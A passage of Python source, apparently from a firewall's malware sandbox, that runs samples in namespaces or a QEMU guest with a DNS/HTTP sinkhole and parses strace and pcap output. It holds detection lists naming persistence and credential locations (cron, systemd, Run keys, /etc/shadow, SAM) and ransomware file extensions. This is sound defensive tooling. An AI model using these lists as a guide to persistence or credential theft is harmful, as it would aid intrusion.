#   BE CLEAR ABOUT THE LIMIT: this is an OBSERVATION chamber, not a containment
#   boundary. Without a chroot the host filesystem is still visible read-mostly,
#   and a sample written to escape a user namespace may succeed. Run it on a box
#   you are willing to rebuild, or give it jail_root, or use QemuChamber -- which
#   is a real boundary -- for samples you have reason to fear.
# ===========================================================================
# Syscalls worth tracing. Anything outside this set is noise for our purposes
# and makes the trace file large enough to slow the analysis down.
STRACE_SET = ("execve,execveat,clone,clone3,fork,vfork,open,openat,creat,"
              "unlink,unlinkat,rename,renameat,renameat2,chmod,fchmodat,"
              "socket,connect,sendto,sendmsg,bind,listen,ptrace,mprotect,"
              "memfd_create,mount,kill,prctl,setuid,setgid,mmap")

# strace prefixes each line with the pid in one of three ways depending on how
# it was invoked: "[pid  123] call(...)" (with -f, to a terminal), "123  call(...)"
# (with -f and -o FILE, which is what the chamber uses), or no prefix at all
# (single process). All three are stripped here rather than guessed at.
_STRACE_PREFIX = re.compile(r"^(?:\[pid\s+\d+\]\s+|\d+\s+)?")
_STRACE_NAME = re.compile(r"^([a-zA-Z_][a-zA-Z0-9_]*)\(")
_SOCKADDR_IN = re.compile(
    r'sin_port=htons\((\d+)\).*?sin_addr=inet_addr\("([^"]+)"\)', re.S)
_SOCKADDR_IN6 = re.compile(
    r'sin6_port=htons\((\d+)\).*?inet_pton\([^,]+,\s*"([^"]+)"', re.S)
_QUOTED = re.compile(r'"((?:[^"\\]|\\.)*)"')


def _interpreter_for(ftype: Optional[str], data: bytes) -> Optional[List[str]]:
    """How to launch this object, or None if we should not try.

    A shebang is honoured only when the interpreter it names exists, because a
    jail that cannot start the sample produces a confidently empty trace, which
    is worse than declining to run it.
    """
    if data[:2] == b"#!":
        line = data[2:data.find(b"\n") if b"\n" in data[:256] else 128]
        argv = line.decode("ascii", "ignore").strip().split()
        if argv and os.path.exists(argv[0]):
            return argv
        if argv and shutil.which(os.path.basename(argv[0])):
            return [shutil.which(os.path.basename(argv[0]))] + argv[1:]
        return None
    if ftype == "elf":
        return []                                   # exec it directly
    if ftype == "php" and shutil.which("php"):
        return [shutil.which("php")]
    if ftype in (None, "script", "text"):
        low = data[:4096].lower()
        if b"import " in low or b"def " in low:
            return [sys.executable]
        if any(t in low for t in (b"#!/bin/sh", b"echo ", b"curl ", b"wget ",
                                  b"export ", b"if [")):
            sh = shutil.which("sh")
            return [sh] if sh else None
    return None


def _split_call(line: str) -> Optional[Tuple[str, str, str]]:
    """Split one strace line into (syscall, args, return).

    Returns None for anything that is not a syscall line: signal reports
    (`--- SIGCHLD ---`), exit notices (`+++ exited with 0 +++`), and resumption
    stubs. A call left `<unfinished ...>` returns a ret of "unfinished" -- its
    arguments are already known and are the part we want.
    """
    line = _STRACE_PREFIX.sub("", line.strip(), count=1)
    if not line or line[0] in "-+<":
        return None
    m = _STRACE_NAME.match(line)
    if not m:
        return None
    call = m.group(1)
    rest = line[m.end():]
    if "<unfinished" in rest:
        return call, rest.split("<unfinished", 1)[0], "unfinished"
    # The argument list can itself contain ") = ", so take the LAST one.
    cut = rest.rfind(") = ")
    if cut < 0:
        cut = rest.rfind(")  = ")
        if cut < 0:
            return call, rest.rstrip(")"), ""
    return call, rest[:cut], rest[cut + 4:].strip()


def parse_strace(path: str, tr: BehaviorTrace, *, limit: int = 20000) -> int:
    """Turn an strace log into live observations. Returns lines consumed.

    Everything recorded here is `live=True`: the sample really made this call.
    Failed calls are kept deliberately -- a connect() that returned ENETUNREACH
    still tells us exactly which C2 address the sample wanted.
    """
    n = 0
    try:
        fh = open(path, "r", errors="replace")
    except OSError as e:
        tr.errors.append("strace log unreadable: %s" % e)
        return 0
    with fh:
        for line in fh:
            n += 1
            if n > limit:
                tr.add("error", "trace_truncated",
                       "stopped parsing after %d lines" % limit)
                break
            split = _split_call(line)
            if split is None:
                continue
            call, args, ret = split
            failed = ret.startswith("-1")

            if call in ("execve", "execveat"):
                q = _QUOTED.search(args)
                if q:
                    tr.add("process", "exec", "executed %s%s" %
                           (q.group(1), " (failed)" if failed else ""),
                           live=True, value=q.group(1))
            elif call in ("clone", "clone3", "fork", "vfork"):
                tr.add("process", "spawn", "created a child process", live=True)
            elif call == "connect":
                ip4 = _SOCKADDR_IN.search(args)
                ip6 = _SOCKADDR_IN6.search(args)
                if ip4:
                    port, addr = ip4.group(1), ip4.group(2)
                    tr.add("net", "connect", "connect to %s:%s%s" %
                           (addr, port, " (failed)" if failed else ""),
                           live=True, value="%s:%s" % (addr, port))
                elif ip6:
                    tr.add("net", "connect", "connect to [%s]:%s" %
                           (ip6.group(2), ip6.group(1)), live=True,
                           value="[%s]:%s" % (ip6.group(2), ip6.group(1)))
                elif "sun_path" in args:
                    q = _QUOTED.search(args)
                    tr.add("net", "unix_connect", "unix socket %s" %
                           (q.group(1) if q else "?"), live=True)
            elif call in ("open", "openat", "creat"):
                q = _QUOTED.search(args)
                if not q or failed:
                    continue
                p = q.group(1)
                writing = any(f in args for f in ("O_WRONLY", "O_RDWR",
                                                  "O_CREAT", "O_TRUNC"))
                if writing:
                    tr.add("file", "write", "wrote %s" % p, live=True, value=p)
                    _classify_path(p, tr)
            elif call in ("unlink", "unlinkat"):
                q = _QUOTED.search(args)
                if q:
                    tr.add("file", "delete", "deleted %s" % q.group(1),
                           live=True, value=q.group(1))
            elif call in ("chmod", "fchmodat"):
                q = _QUOTED.search(args)
                if q and ("0111" in args or "0755" in args or "0777" in args
                          or "S_IXUSR" in args):
                    tr.add("file", "make_executable",
                           "made %s executable" % q.group(1), live=True,
                           value=q.group(1))
            elif call == "ptrace":
                tr.add("capability", "proc_inject", "called ptrace", live=True)
            elif call == "mprotect" and "PROT_EXEC" in args and "PROT_WRITE" in args:
                tr.add("capability", "rwx",
                       "mprotect made a page writable and executable", live=True)
            elif call == "memfd_create":
                tr.add("capability", "fileless",
                       "created an anonymous in-memory file", live=True)
            elif call == "mount" and not failed:
                tr.add("evade", "mount", "mounted a filesystem", live=True)
            elif call == "kill":
                tr.add("process", "kill", "sent a signal to another process",
                       live=True)
    return n


# Paths whose modification means something specific. Checked against every
# file a sample writes, so a persistence attempt is named as such rather than
# appearing as one more anonymous write.
PERSIST_PATHS: List[Tuple[str, str, str]] = [
    ("/etc/cron",          "persist_cron", "cron persistence"),
    ("/var/spool/cron",    "persist_cron", "cron persistence"),
    ("/etc/rc.local",      "persist_init", "init-script persistence"),
    ("/etc/init.d",        "persist_init", "init-script persistence"),
    ("/etc/systemd/system", "persist_unit", "systemd unit persistence"),
    ("/lib/systemd/system", "persist_unit", "systemd unit persistence"),
    ("/.config/autostart", "persist_desktop", "desktop autostart persistence"),
    ("/.bashrc",           "persist_profile", "shell-profile persistence"),
    ("/.bash_profile",     "persist_profile", "shell-profile persistence"),
    ("/.profile",          "persist_profile", "shell-profile persistence"),
    ("/authorized_keys",   "persist_ssh", "SSH key persistence"),
    ("/etc/ld.so.preload", "persist_preload", "ld.so.preload hijack"),
    # Windows. PERSIST_PATHS was entirely POSIX, so a guest chamber writing to
    # a Startup folder or a Run key produced NO observation at all -- measured.
    # Matched case-folded as substrings, so the leading drive letter is omitted.
    ("\\start menu\\programs\\startup", "persist_startup", "Startup-folder persistence"),
    ("\\currentversion\\run", "persist_reg", "Run-key persistence"),
    ("\\currentversion\\runonce", "persist_reg", "RunOnce-key persistence"),
    ("\\currentversion\\policies\\explorer\\run", "persist_reg", "policy Run-key persistence"),
    ("\\currentcontrolset\\services", "persist_svc", "service persistence"),
    ("\\windows\\system32\\tasks", "persist_task", "scheduled-task persistence"),
    ("\\windows\\tasks", "persist_task", "scheduled-task persistence"),
    ("\\appdata\\roaming\\microsoft\\windows\\start menu", "persist_startup", "Startup-folder persistence"),
    ("\\winlogon\\shell", "persist_reg", "Winlogon shell hijack"),
    ("\\winlogon\\userinit", "persist_reg", "Winlogon userinit hijack"),
    ("\\image file execution options", "persist_ifeo", "IFEO debugger hijack"),
    ("\\system32\\drivers\\etc\\hosts", "hosts_file", "hosts-file modification"),
    ("\\system32\\config\\sam", "account_change", "SAM database access"),
    ("/etc/passwd",        "account_change", "account database modified"),
    ("/etc/shadow",        "account_change", "credential database modified"),
    ("/etc/sudoers",       "priv_escalation", "sudoers modified"),
]

# Extensions a ransomware run leaves behind. Used only in aggregate: one file
# is nothing, dozens in one run is the finding.
CRYPTO_EXTENSIONS = (".locked", ".encrypted", ".crypt", ".crypto", ".enc",
                     ".cerber", ".locky", ".wncry", ".wnry", ".ryk", ".conti")


def _classify_path(path: str, tr: BehaviorTrace) -> None:
    """Name the significance of a written path, if it has any."""
    low = path.lower()
    for needle, token, desc in PERSIST_PATHS:
        if needle in low:
            kind = "persist" if token.startswith("persist") else "file"
            tr.add(kind, token, "%s: %s" % (desc, path), live=True, value=path)
            return
    if low.endswith(CRYPTO_EXTENSIONS):
        tr.add("crypto", "ransom_extension",
               "wrote a ransom-marked file: %s" % path, live=True, value=path)
    elif any(t in low for t in ("readme", "how_to", "howto", "decrypt",
                                "recover", "ransom")) and low.endswith(
                                    (".txt", ".html", ".hta")):
        tr.add("crypto", "ransom_note", "wrote a ransom-note-shaped file: %s"
               % path, live=True, value=path)


def _snapshot(root: str) -> Dict[str, int]:
    """Path -> size for every regular file under root. Bounded."""
    out: Dict[str, int] = {}
    for base, dirs, files in os.walk(root):
        if len(out) > 4096:
            break
        dirs[:] = dirs[:64]
        for f in files[:512]:
            p = os.path.join(base, f)
            try:
                out[os.path.relpath(p, root)] = os.path.getsize(p)
            except OSError:
                continue
    return out


def _collect_dropped(root: str, before: Dict[str, int], tr: BehaviorTrace,
                     *, skip: Sequence[str] = ()) -> None:
    """Diff the scratch tree and record whatever the sample left behind.

    A dropped file's own magic is strong evidence: a shell script that drops an
    ELF is a downloader whatever its strings say.
    """
    after = _snapshot(root)
    for rel, size in sorted(after.items()):
        if rel in skip:
            continue
        if rel in before and before[rel] == size:
            continue
        p = os.path.join(root, rel)
        try:
            with open(p, "rb") as fh:
                head = fh.read(1 << 20)
        except OSError:
            continue
        ftype = detect_file_type(head)
        rec = {"name": rel, "size": size,
               "sha256": hashlib.sha256(head).hexdigest() if size <= (1 << 20)
               else "", "type": ftype or ""}
        tr.dropped.append(rec)
        tr.add("file", "dropped", "dropped %s (%d bytes, %s)" %
               (rel, size, ftype or "unknown type"), live=True, value=rel)
        # Runnable by any of three routes. On Linux the dropped stage is as
        # often a chmod +x script as it is an ELF, so testing the magic alone
        # misses the common case.
        try:
            mode_exec = bool(os.stat(p).st_mode & 0o111)
        except OSError:
            mode_exec = False
        why = ("a %s object" % ftype if ftype in ("pe", "elf", "macho")
               else "a script with an interpreter line" if head[:2] == b"#!"
               else "marked executable" if mode_exec else "")
        if why:
            tr.add("file", "dropped_executable",
                   "dropped something runnable: %s (%s)" % (rel, why),
                   live=True, value=rel)
        _classify_path("/" + rel, tr)


class JailChamber(Chamber):
    """Fidelity 1: execute a native-arch sample in namespaces, under strace."""

    name = "jail"
    fidelity = 1
    executes = True

    def __init__(self, *, workdir: Optional[str] = None, jail_root: Optional[str] = None,
                 mem_mb: int = 512, allow_no_strace: bool = True):
        self.workdir = workdir
        self.jail_root = jail_root
        self.mem_mb = mem_mb
        self.allow_no_strace = allow_no_strace

    # -- availability ------------------------------------------------------
    def status(self) -> ChamberStatus:
        def no(reason):
            return ChamberStatus(self.name, self.fidelity, False, reason,
                                 executes=True)
        if not sys.platform.startswith("linux"):
            return no("needs Linux namespaces (running on %s)" % sys.platform)
        if not shutil.which("unshare"):
            return no("unshare(1) not installed")
        ok, why = self._userns_ok()
        if not ok:
            return no(why)
        extra = "" if shutil.which("strace") else \
            " (no strace: syscall trace unavailable, drops + net only)"
        if not shutil.which("strace") and not self.allow_no_strace:
            return no("strace(1) not installed and allow_no_strace is off")
        return ChamberStatus(self.name, self.fidelity, True,
                             "namespaced execution" + extra, executes=True)

    @staticmethod
    def _userns_ok() -> Tuple[bool, str]:
        """Can we get an unprivileged user namespace on this kernel?"""
        p = "/proc/sys/kernel/unprivileged_userns_clone"
        try:
            if os.path.exists(p):
                with open(p) as fh:
                    if fh.read().strip() == "0":
                        return False, "unprivileged user namespaces disabled by sysctl"
        except OSError:
            pass
        try:
            r = subprocess.run(["unshare", "--map-root-user", "--user",
                                "true"], capture_output=True, timeout=10)
            if r.returncode != 0:
                return False, ("user namespace refused: %s" %
                               r.stderr.decode("utf-8", "replace").strip()[:120])
        except (OSError, subprocess.SubprocessError) as e:
            return False, "cannot test user namespace: %s" % e
        return True, ""

    def handles(self, ftype: Optional[str], data: bytes) -> bool:
        """Only objects this machine can actually execute."""
        if ftype == "elf":
            return self._elf_is_native(data)
        if ftype in ("pe", "macho", "ole", "zip", "pdf"):
            return False                            # wrong OS: that is QEMU's job
        return _interpreter_for(ftype, data) is not None

    @staticmethod
    def _elf_is_native(data: bytes) -> bool:
        """Refuse a foreign-arch ELF: running it would only prove exec failed."""
        if len(data) < 20 or data[:4] != b"\x7fELF":
            return False
        is64, big = data[4] == 2, data[5] == 2
        end = ">" if big else "<"
        machine = struct.unpack_from(end + "H", data, 18)[0]
        host = os.uname().machine if hasattr(os, "uname") else ""
        want = {"x86_64": (62, 3), "i686": (3,), "i386": (3,),
                "aarch64": (183, 40), "armv7l": (40,),
                "mips64": (8,), "mips": (8,), "ppc64le": (21,),
                "riscv64": (243,)}.get(host, ())
        if machine not in want:
            return False
        # A 64-bit host runs 32-bit binaries only with the right libraries; a
        # 32-bit host cannot run 64-bit at all.
        if is64 and host in ("i686", "i386", "armv7l"):
            return False
        return True

    # -- execution ---------------------------------------------------------
    def run(self, sha256: str, data: bytes, meta: dict, *,
            timeout: int = DEFAULT_TIMEOUT) -> BehaviorTrace:
        tr = BehaviorTrace(sha256=sha256, chamber=self.name,
                           fidelity=self.fidelity, size=len(data),
                           file_type=detect_file_type(data))
        st = self.status()
        if not st.available:
            tr.add("error", "chamber_unavailable", st.reason)
            tr.errors.append(st.reason)
            return tr

        t0 = time.time()
        work = tempfile.mkdtemp(prefix="crucible-", dir=self.workdir)
        scratch = os.path.join(work, "scratch")
        os.makedirs(scratch, exist_ok=True)
        sample = os.path.join(scratch, "sample")
        events = os.path.join(work, "events.json")
        tracelog = os.path.join(work, "trace.log")
        try:
            with open(sample, "wb") as fh:
                fh.write(data)
            os.chmod(sample, 0o755)
            before = _snapshot(scratch)

            argv = ["unshare", "--map-root-user", "--user", "--mount", "--pid",
                    "--net", "--fork", "--mount-proc",
                    sys.executable, os.path.abspath(__file__), "_jail-runner",
                    "--sample", sample, "--scratch", scratch,
                    "--events", events, "--timeout", str(timeout)]
            if shutil.which("strace"):
                argv += ["--strace", tracelog]
            if self.jail_root:
                argv += ["--jail-root", self.jail_root]

            # The outer timeout is deliberately longer than the inner one: the
            # runner is responsible for stopping the sample, and this is only
            # the backstop for a runner that has itself wedged.
            try:
                proc = subprocess.run(argv, capture_output=True,
                                      timeout=timeout + 20)
                rc = proc.returncode
                err = proc.stderr.decode("utf-8", "replace")[-2000:]
            except subprocess.TimeoutExpired:
                rc, err = -1, "runner exceeded %ds" % (timeout + 20)
                tr.add("evade", "hung", "analysis had to be killed", live=True)
            if err.strip():
                logger.debug("jail runner stderr: %s", err.strip()[:400])

            # -- fold in what the runner reported --------------------------
            if os.path.exists(events):
                try:
                    with open(events) as fh:
                        rep = json.load(fh)
                    self._fold_runner(rep, tr)
                except (OSError, ValueError) as e:
                    tr.errors.append("runner report unreadable: %s" % e)
            else:
                tr.errors.append("runner produced no report (rc=%s)" % rc)
                tr.add("error", "no_report", err.strip()[:200] or "rc=%s" % rc)

            if os.path.exists(tracelog):
                lines = parse_strace(tracelog, tr)
                tr.add("meta", "trace_lines", "%d traced calls" % lines,
                       value=str(lines))
            _collect_dropped(scratch, before, tr, skip=("sample",))
        finally:
            shutil.rmtree(work, ignore_errors=True)
        tr.duration = time.time() - t0
        return tr

    @staticmethod
    def _fold_runner(rep: dict, tr: BehaviorTrace) -> None:
        """Absorb the in-namespace runner's own findings."""
        tr.executed = bool(rep.get("executed"))
        if rep.get("launch_error"):
            tr.add("error", "launch_failed", str(rep["launch_error"])[:200])
        if rep.get("exit_code") is not None:
            code = rep["exit_code"]
            tr.add("process", "exited", "exit code %s" % code,
                   live=True, value=str(code))
            # subprocess reports a signal death as a NEGATIVE returncode. Such
            # a sample never reached its own logic, so the run cannot clear it
            # unless something else was observed first -- see conclusive().
            try:
                signalled = int(code) < 0
            except (TypeError, ValueError):
                signalled = False
            if signalled:
                tr.add("process", "crashed",
                       "died on signal %d before finishing" % -int(code),
                       live=True, value=str(code))
        if rep.get("timed_out"):
            # Running until killed is not a fault: long-running samples are
            # usually the interesting ones (beacon loops, encryption sweeps).
            tr.add("process", "ran_to_timeout",
                   "still running when the budget expired", live=True)
        if rep.get("wall") is not None:
            tr.add("meta", "run_seconds", "%.2fs of execution" % rep["wall"],
                   value="%.2f" % rep["wall"])
        for ev in rep.get("sinkhole", []):
            kind = ev.get("kind")
            if kind == "dns" and ev.get("name"):
                tr.add("net", "dns_query", "resolved %s" % ev["name"],
                       live=True, value=ev["name"])
            elif kind == "http":
                req = ev.get("request", "")
                tr.add("net", "http_request", "%s host=%s ua=%s" %
                       (req, ev.get("host", ""), ev.get("ua", "")),
                       live=True, value=ev.get("host") or req)
                if ev.get("ua"):
                    tr.add("net", "http_ua", "User-Agent %s" % ev["ua"],
                           live=True, value=ev["ua"])
                if req:
                    parts = req.split(" ")
                    tr.add("net", "http_uri", req, live=True,
                           value=parts[1] if len(parts) > 1 else req)
            elif kind == "tls" and ev.get("sni"):
                tr.add("net", "tls_sni", "TLS SNI %s" % ev["sni"], live=True,
                       value=ev["sni"])
        for line in rep.get("stdout_notable", [])[:32]:
            tr.strings.append(line)


# ===========================================================================
# The in-namespace runner
#
# Runs as PID 1 of the jail's PID namespace, as root of its user namespace.
# Nothing here is reachable from the CLI a user would type; JailChamber invokes
# it as `ffn_crucible.py _jail-runner`. It is a separate process on purpose:
# it must be INSIDE the namespaces to bind the sinkhole on the jail's loopback,
# and unshare(1) can only give us that by exec'ing something.
# ===========================================================================
def _jail_runner(args) -> int:
    rep: Dict = {"executed": False, "exit_code": None, "timed_out": False,
                 "sinkhole": [], "stdout_notable": [], "launch_error": None}

    # Loopback comes up because we are root in this network namespace. Without
    # it the sinkhole cannot be bound and the sample sees no network at all.
    for cmd in (["ip", "link", "set", "lo", "up"],
                ["ifconfig", "lo", "up"]):
        if shutil.which(cmd[0]):
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
                break
            except (OSError, subprocess.SubprocessError):
                continue

    sink = Sinkhole(bind="127.0.0.1", sink_ip="127.0.0.1",
                    dns_port=53, http_port=80, tls_port=443)
    ports = sink.start()
    rep["sinkhole_ports"] = ports

    # Point resolution at ourselves. The bind mount lives in this mount
    # namespace only, so the host's /etc/resolv.conf is untouched.
    try:
        fake = os.path.join(os.path.dirname(args.events), "resolv.conf")
        with open(fake, "w") as fh:
            fh.write("nameserver 127.0.0.1\noptions timeout:1 attempts:1\n")
        subprocess.run(["mount", "--bind", fake, "/etc/resolv.conf"],
                       capture_output=True, timeout=5)
    except (OSError, subprocess.SubprocessError) as e:
        rep["resolv_error"] = str(e)[:200]

    if args.jail_root and os.path.isdir(args.jail_root):
        try:
            os.chroot(args.jail_root)
            os.chdir("/")
        except OSError as e:
            rep["chroot_error"] = str(e)[:200]

    # -- build the command ------------------------------------------------
    try:
        with open(args.sample, "rb") as fh:
            head = fh.read(8192)
    except OSError as e:
        rep["launch_error"] = "cannot read sample: %s" % e
        _finish_runner(sink, rep, args.events)
        return 1
    interp = _interpreter_for(detect_file_type(head), head)
    if interp is None:
        rep["launch_error"] = "no interpreter for this object"
        _finish_runner(sink, rep, args.events)
        return 1
    cmd = list(interp) + [args.sample]
    if args.strace and shutil.which("strace"):
        cmd = ["strace", "-f", "-qq", "-s", "128", "-e",
               "trace=" + STRACE_SET, "-o", args.strace] + cmd

    def limits():
        try:
            import resource
            resource.setrlimit(resource.RLIMIT_CPU, (args.timeout, args.timeout + 2))
            resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
            resource.setrlimit(resource.RLIMIT_FSIZE,
                               (256 << 20, 256 << 20))
            resource.setrlimit(resource.RLIMIT_NPROC, (64, 64))
        except Exception:
            pass

    t0 = time.time()
    try:
        proc = subprocess.Popen(cmd, cwd=args.scratch, stdin=subprocess.DEVNULL,
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                preexec_fn=limits, start_new_session=True)
    except OSError as e:
        rep["launch_error"] = "exec failed: %s" % e
        _finish_runner(sink, rep, args.events)
        return 1

    rep["executed"] = True
    try:
        out, _ = proc.communicate(timeout=args.timeout)
        rep["exit_code"] = proc.returncode
    except subprocess.TimeoutExpired:
        rep["timed_out"] = True
        proc.kill()
        try:
            out, _ = proc.communicate(timeout=5)
        except subprocess.SubprocessError:
            out = b""
        rep["exit_code"] = None
    rep["wall"] = time.time() - t0

    # Keep a few lines of output: droppers habitually print their progress, and
    # a URL echoed to stdout is as good an indicator as one seen on the wire.
    for line in (out or b"").decode("utf-8", "replace").splitlines():
        s = line.strip()
        if 8 <= len(s) <= 400 and len(rep["stdout_notable"]) < 32:
            rep["stdout_notable"].append(s)

    _finish_runner(sink, rep, args.events)
    return 0


def _finish_runner(sink: "Sinkhole", rep: dict, out_path: str) -> None:
    """Give late traffic a moment to arrive, then write the report."""
    time.sleep(0.5)
    with sink._lock:                              # noqa: SLF001 - same module
        rep["sinkhole"] = list(sink.events)
    sink.stop()
    try:
        with open(out_path, "w") as fh:
            json.dump(rep, fh)
    except OSError as e:
        sys.stderr.write("cannot write runner report: %s\n" % e)


# ===========================================================================
# pcap parsing
#
# QemuChamber runs the guest with `restrict=on` -- no route to the host, no
# route to the internet -- and taps the virtual NIC with filter-dump. That
# gives complete isolation and still yields the artefacts worth having, because
# the DNS question, the HTTP request line and the TLS SNI are all in the first
# packet of each attempt regardless of whether anything answered.
# ===========================================================================
PCAP_MAGIC_LE = 0xA1B2C3D4
PCAP_MAGIC_BE = 0xD4C3B2A1
PCAP_MAGIC_NS_LE = 0xA1B23C4D


def parse_pcap(path: str, tr: BehaviorTrace, *, max_packets: int = 20000) -> int:
    """Extract DNS questions, HTTP requests and TLS SNI from a pcap file.

    Deliberately only handles Ethernet/IPv4/{TCP,UDP} -- that is what a SLIRP
    tap produces. Anything else is skipped rather than guessed at.
    """
    try:
        raw = open(path, "rb").read(64 << 20)
    except OSError as e:
        tr.errors.append("pcap unreadable: %s" % e)
        return 0
    if len(raw) < 24:
        return 0
    magic = struct.unpack_from("<I", raw, 0)[0]
    if magic in (PCAP_MAGIC_LE, PCAP_MAGIC_NS_LE):
        end = "<"
    elif magic == PCAP_MAGIC_BE:
        end = ">"
    else:
        tr.errors.append("not a pcap file (magic 0x%08x)" % magic)
        return 0
    linktype = struct.unpack_from(end + "I", raw, 20)[0]
    off, n = 24, 0
    seen_udp: set = set()
    while off + 16 <= len(raw) and n < max_packets:
        _ts, _us, caplen, _origlen = struct.unpack_from(end + "IIII", raw, off)
        off += 16
        if caplen > len(raw) - off or caplen > (1 << 20):
            break
        pkt = raw[off:off + caplen]
        off += caplen
        n += 1
        try:
            _pcap_packet(pkt, linktype, tr, seen_udp)
        except (struct.error, IndexError, UnicodeError):
            continue
    return n


def _pcap_packet(pkt: bytes, linktype: int, tr: BehaviorTrace,
                 seen_udp: set) -> None:
    """Decode one captured frame far enough to find an indicator."""
    if linktype == 1:                                # LINKTYPE_ETHERNET
        if len(pkt) < 14:
            return
        etype = struct.unpack_from(">H", pkt, 12)[0]
        ip = pkt[14:]
        if etype == 0x8100:                          # single VLAN tag
            etype = struct.unpack_from(">H", pkt, 16)[0]
            ip = pkt[18:]
        if etype != 0x0800:
            return
    elif linktype == 101:                            # LINKTYPE_RAW
        ip = pkt
    else:
        return
    if len(ip) < 20 or (ip[0] >> 4) != 4:
        return
    ihl = (ip[0] & 0x0F) * 4
    proto = ip[9]
    dst = socket.inet_ntoa(ip[16:20])
    l4 = ip[ihl:]

    if proto == 17 and len(l4) >= 8:                 # UDP
        sport, dport = struct.unpack_from(">HH", l4, 0)
        body = l4[8:]
        if dport == 53 and len(body) > 12:
            name, _ = Sinkhole._dns_name(body, 12)
            if name and name not in seen_udp:
                seen_udp.add(name)
                tr.add("net", "dns_query", "resolved %s" % name,
                       live=True, value=name)
        elif dport not in (53, 67, 68, 5353, 137, 138):
            tr.add("net", "udp_send", "UDP to %s:%d" % (dst, dport),
                   live=True, value="%s:%d/udp" % (dst, dport))
    elif proto == 6 and len(l4) >= 20:               # TCP
        sport, dport = struct.unpack_from(">HH", l4, 0)
        doff = ((l4[12] >> 4) & 0xF) * 4
        flags = l4[13]
        payload = l4[doff:]
        if flags & 0x02 and not flags & 0x10:        # SYN without ACK
            tr.add("net", "connect", "connect to %s:%d" % (dst, dport),
                   live=True, value="%s:%d" % (dst, dport))
        if not payload:
            return
        if payload[:1] == b"\x16":
            sni = Sinkhole._sni_of(payload)
            if sni:
                tr.add("net", "tls_sni", "TLS SNI %s" % sni, live=True, value=sni)
        elif payload[:5] in (b"GET /", b"POST ", b"HEAD ", b"PUT /") \
                or payload[:4] == b"GET ":
            _pcap_http(payload, tr)


def _pcap_http(payload: bytes, tr: BehaviorTrace) -> None:
    """Pull the request line, Host and User-Agent out of an HTTP request."""
    eol = b"\x0d\x0a"
    head = payload.split(eol + eol, 1)[0][:8192].decode("latin-1", "replace")
    lines = head.split(eol.decode())
    if not lines:
        return
    request = lines[0][:512]
    host = ua = ""
    for ln in lines[1:]:
        low = ln.lower()
        if low.startswith("host:"):
            host = ln.split(":", 1)[1].strip()[:256]
        elif low.startswith("user-agent:"):
            ua = ln.split(":", 1)[1].strip()[:256]
    tr.add("net", "http_request", "%s host=%s ua=%s" % (request, host, ua),
           live=True, value=host or request)
    if ua:
        tr.add("net", "http_ua", "User-Agent %s" % ua, live=True, value=ua)
    parts = request.split(" ")
    if len(parts) > 1:
        tr.add("net", "http_uri", request, live=True, value=parts[1])


# ===========================================================================
# QemuChamber -- fidelity 2: a real guest, a real boundary.
#
# This is the only chamber that is a genuine containment boundary, and the only
# one that can run a Windows PE or an Office macro. It needs a prepared guest
# image, which an appliance does not have by default -- so it reports itself
# unavailable, with the reason, until an operator builds one.
#
# GUEST IMAGE CONTRACT (see docs/crucible-guest-image.md)
#   * a qcow2 the guest OS boots unattended to a logged-in session;
#   * the crucible guest agent set to run at logon;
#   * the agent finds the sample on the read-only FAT disk we attach as the
#     volume labelled CRUCIBLE, runs it, and writes newline-delimited JSON
#     observations to the virtio-serial port named ffn.crucible.0;
#   * the agent writes a final {"done": true} line, which is how we know the
#     run finished rather than the budget expiring.
# Nothing about the guest OS is assumed beyond that contract.
# ===========================================================================
@dataclass
class GuestProfile:
    """One prepared guest image and how to drive it."""
    name: str = "win10-x64"
    image: str = ""                       # base qcow2; never written to
    qemu: str = "qemu-system-x86_64"
    memory_mb: int = 2048
    cpus: int = 2
    accel: str = "kvm"                    # kvm / tcg / hvf
    boot_seconds: int = 60                # budget for reaching the agent
    machine: str = ""                     # optional -machine value
    extra_args: List[str] = field(default_factory=list)

    @classmethod
    def load(cls, path: str) -> List["GuestProfile"]:
        """Read guest profiles from JSON. Missing file -> no guests."""
        try:
            with open(path) as fh:
                doc = json.load(fh)
        except (OSError, ValueError):
            return []
        out = []
        for ent in doc.get("guests", []):
            if not isinstance(ent, dict):
                continue
            prof = cls()
            for k, v in ent.items():
                if hasattr(prof, k):
                    setattr(prof, k, v)
            out.append(prof)
        return out


DEFAULT_GUEST_PROFILES = "/etc/ffn-ngfw/crucible-guests.json"

# Which file types belong in a guest, and which guest family can run them.
GUEST_TYPES = ("pe", "ole", "zip", "pdf", "html_js", "script", "php", None)


class QemuChamber(Chamber):
    """Fidelity 2: detonate inside a throwaway guest VM."""

    name = "qemu"
    fidelity = 2
    executes = True

    def __init__(self, profiles: Optional[List[GuestProfile]] = None, *,
                 profile_path: str = DEFAULT_GUEST_PROFILES,
                 workdir: Optional[str] = None, capture: bool = True):
        self.profiles = profiles if profiles is not None \
            else GuestProfile.load(profile_path)
        self.profile_path = profile_path
        self.workdir = workdir
        self.capture = capture

    # -- availability ------------------------------------------------------
    def status(self) -> ChamberStatus:
        def no(reason):
            return ChamberStatus(self.name, self.fidelity, False, reason,
                                 executes=True)
        if not self.profiles:
            return no("no guest profiles in %s" % self.profile_path)
        prof = self.profiles[0]
        if not shutil.which(prof.qemu):
            return no("%s not installed" % prof.qemu)
        if not prof.image or not os.path.exists(prof.image):
            return no("guest image %r missing" % (prof.image or "<unset>"))
        if not shutil.which("qemu-img"):
            return no("qemu-img not installed (needed for the overlay)")
        accel = prof.accel
        if accel == "kvm" and not os.path.exists("/dev/kvm"):
            accel = "tcg"
        return ChamberStatus(self.name, self.fidelity, True,
                             "guest %s via %s (%s)" % (prof.name, prof.qemu, accel),
                             executes=True)

    def handles(self, ftype: Optional[str], data: bytes) -> bool:
        return ftype in GUEST_TYPES

    def _pick(self, ftype: Optional[str]) -> Optional[GuestProfile]:
        return self.profiles[0] if self.profiles else None

    # -- execution ---------------------------------------------------------
    def run(self, sha256: str, data: bytes, meta: dict, *,
            timeout: int = DEFAULT_TIMEOUT) -> BehaviorTrace:
        tr = BehaviorTrace(sha256=sha256, chamber=self.name,
                           fidelity=self.fidelity, size=len(data),
                           file_type=detect_file_type(data))
        st = self.status()
        if not st.available:
            tr.add("error", "chamber_unavailable", st.reason)
            tr.errors.append(st.reason)
            return tr
        prof = self._pick(tr.file_type)
        t0 = time.time()
        work = tempfile.mkdtemp(prefix="crucible-vm-", dir=self.workdir)
        payload_dir = os.path.join(work, "CRUCIBLE")
